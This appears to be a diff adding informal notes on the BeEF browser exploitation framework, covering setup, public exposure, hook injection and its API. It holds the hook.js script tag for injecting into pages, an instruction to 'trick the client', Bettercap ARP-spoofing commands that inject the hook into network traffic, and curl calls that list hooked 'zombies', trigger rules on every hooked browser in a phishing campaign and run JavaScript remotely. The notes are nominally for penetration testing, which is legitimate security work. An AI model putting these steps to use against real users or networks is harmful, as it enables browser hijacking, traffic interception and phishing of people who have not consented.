@@ -1,0 +1,104 @@
+ Beef Framework
+  1. Sudo apt install beef
+  2. npm fund
+  3. change password in config.yaml
+  4. Ensure ports are unlocked
+  5. localhost:3000/ui/panel
+  6. To inject beef place the hook <script src="http://your-ip:3000/hook.js">
+  7. To expose to the WEB
+    1.Forward port 3000 on your router to your beef server
+    2. Set in the config.yaml beef.http.public & beef.http.public_port to your public Ip and forwarded port.
+  8. To run beef behind a reverse proxy such as nginx. Proxy requests to Beefs internal port and your config matches the public data.
+  9. Advanced Scenarios
+    1.Beefs tunneling proxy lets you request through a hooked browser, but this is for in-domain requests.
+  10. Send the Hook URL
+    1. Send a direct link to the page
+    2. Use a proxy such as Bettercap or Beefs
+  11. Pen Testing with Beef
+    1. Host a local Page with the beef hook <script src="http://your-ip:3000/hook.js">
+       Replace your-ip with BeEf servres local IP
+    2. Use a simple python server to host a page.
+      python3 -m http.server 80
+    3. Trick the Client
+  12. Arp Spoofing for Network Injection
+    1. Using Bettercap
+      sudo bettercap - iface eth0
+    2.In Bettercaps CLI: set http.proxy.script hook.js http.proxy on arp.spoof on
+  13. If Developer access modify internal code, and insert.
+  14. To enable RPC, this must be done inside metasploit. Insert command;
+  load msgrpc ServerHost=127.0.0.1 User=msf Pass=<password> SSL=y   
+  15. This command can be written in a file and launched with -r option to msfconsole.
+  16. Beef Options:
+  Usage: beef [options]
+    -x, --reset                      Reset the database
+    -v, --verbose                    Display debug information
+    -a, --ascii_art                  Prints BeEF ascii art
+    -c, --config FILE                Load a different configuration file: if it's called custom-config.yaml, git automatically ignores it.
+    -p, --port PORT                  Change the default BeEF listening port
+    -w, --wsport WS_PORT             Change the default BeEF WebSocket listening port
+  17.  Using React with beEf
+  # Returns the entire list of network hosts for all zombies
+curl http://127.0.0.1:3000/api/network/hosts?token=[token]
+
+# Returns the entire list of network services for all zombies
+curl http://127.0.0.1:3000/api/network/services?token=[token]
+
+# Returns all hosts given a specific hooked browser id
+curl http://127.0.0.1:3000/api/network/hosts/[id]?token=[token]
+
+# Returns all services given a specific hooked browser id
+curl http://127.0.0.1:3000/api/network/services/[id]?token=[token]
+
+# Returns a specific network host given its id
+curl http://127.0.0.1:3000/api/network/host/[id]?token=[token]
+
+# Returns a specific network service given its id
+curl http://127.0.0.1:3000/api/network/service/[id]?token=[token]
+  18. Autopwn URL: http://10.1.1.175:8080/5WNrYZjr
+  19.Trigger Rules
+By default rules are triggered only once when the browser is successfully hooked. However there might be cases where you need to add and then immediately trigger a ruleset.
+
+For instance, you have 5 rules pre-loaded during your phishing campaign, but none of them cover Android. At the same time you notice lots of Android targets newly hooked. The ARE is flexible enough to let you add (at runtime) new rules, then trigger them when you want on already-hooked browsers.
+
+Following the last example, given that the newly added rule's ID is 1, you can use the following request to trigger it on every online hooked browser:
+
+curl http://172.16.45.1:3000/api/autorun/rule/trigger/1?token=xyz
+Delete Rule
+This is quite self-explanatory ;-)
+
+curl http://172.16.45.1:3000/api/autorun/rule/delete/1?token=xyz
+List Rule(s)
+If you need to retrieve rule definition data back in JSON, you can do it in two ways:
+
+Getting a specific ruleset by ID (here the ID is 1):
+
+curl http://172.16.45.1:3000/api/autorun/rule/list/1?token=xyz
+Getting all the rulesets in the database:
+
+curl http://172.16.45.1:3000/api/autorun/rule/list/all?token=xyz
+  20. Files
+  config.yaml - configuration file describing the properties of a module.
+module.rb - enables integration of the module with the BeEF web interface
+command.js - the JavaScript "payload" which will be executed on the hooked browser
+  21. Bind External Objects
+  class Your_module < BeEF::Core::Command
+    def pre_send
+        BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/path/to/file','/uri','extension')
+    end
+
+    def post_execute
+        BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/uri.extension')
+    end 
+end
+  22. Upload Java
+  Sending javascript to Execute
+The built in message handler for executing javascript is %<code>, sent just like a normal message.
+
+This sends a message from browser 1 to 2 to execute a piece of JavaScript:
+
+Request
+
+curl -d '{"from":1, "to":2, "message":"%alert(\"hello\");"}' \
+    -H "Content-type: application/json; charset=UTF-8" \
+	 http://localhost:3000/api/webrtc/msg?token=498641adfe687860b55fb90eb6a4b9789fd5c4ca
+
